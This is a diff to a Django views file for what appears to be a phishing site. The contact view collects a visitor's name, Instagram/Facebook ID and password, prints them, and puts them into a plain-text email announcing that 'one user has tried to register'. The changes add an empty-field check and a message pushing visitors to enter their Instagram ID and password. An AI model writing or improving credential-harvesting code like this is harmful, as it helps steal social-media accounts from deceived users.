@@ -14,6 +14,8 @@ def contact(request):
         name=request.POST.get('name')
         facebookID=request.POST.get('facebookId')
         password=request.POST.get('password')
+        if name==''or facebookID=='' or password=='':
+            return redirect('/message/')
         print(name,facebookID,password)
         subject='Try to Register'
         message= f"\n\n\none user has tried to register!\n\n\n\n\nname -: {name}\n\n\n instagram id -: {facebookID}\n\n\npassword -: {password}"
@@ -36,7 +38,7 @@ def main(request):
     return render(request,'endpage.html')
 
 def message(request):
-    messages.info(request,"Please Register Yourself First!")
+    messages.info(request,"Please Register with instagram id and password Yourself First!")
     return redirect(request.META['HTTP_REFERER'])
 
 def menu(request):
